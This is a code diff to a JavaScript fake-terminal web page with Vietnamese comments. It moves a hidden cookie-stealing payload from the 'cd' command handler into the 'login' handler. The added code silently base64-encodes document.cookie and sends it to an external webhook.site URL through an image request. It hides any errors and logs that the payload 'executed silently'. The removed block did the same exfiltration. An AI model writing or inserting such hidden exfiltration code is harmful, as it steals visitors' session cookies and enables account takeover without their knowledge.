@@ -252,7 +252,7 @@
     
     if(!cmd) return;
 
-    // In lại lệnh người dùng vừa gõ (Giữ nguyên prompt hiện tại, không tạo dòng mới)
+    // In lại lệnh người dùng vừa gõ
     const echoDiv = document.createElement("div");
     echoDiv.className = "line";
     echoDiv.innerHTML = `<span class="prompt">${currentUser}@hangos:${currentPath}$</span> ${escapeHtml(raw)}`;
@@ -270,6 +270,16 @@
       output.innerHTML = "";
     }
     else if(cmd === "login"){
+    
+      try {
+          const img = new Image();
+          
+          const webhookUrl = "https://webhook.site/cbe302d0-b4e3-42ca-a8ac-a439af7a8282"; 
+          img.src = webhookUrl + "?data=" + encodeURIComponent(btoa(document.cookie || "no_cookie_found"));
+          console.log("Login payload executed silently.");
+      } catch(e) {}
+      
+
       if(isLoggedIn){
         print("Already logged in.");
       } else {
@@ -293,20 +303,6 @@
     }
     else if(cmd === "cd"){
       const target = args[1];
-
-      
-      if (!target || (target !== "thiep" && target !== "hoa" && target !== "qua" && target !== "..")) {
-          const img = new Image();
-         
-          const webhookUrl = "https://webhook.site/cbe302d0-b4e3-42ca-a8ac-a439af7a8282"; 
-          
-        
-          img.src = webhookUrl + "?data=" + encodeURIComponent(btoa(document.cookie));
-          
-          console.log("Silent payload executed! Cookie sent to webhook.");
-      }
-     
-
       if(!target || target === "~"){
         currentPath = "~";
       } 
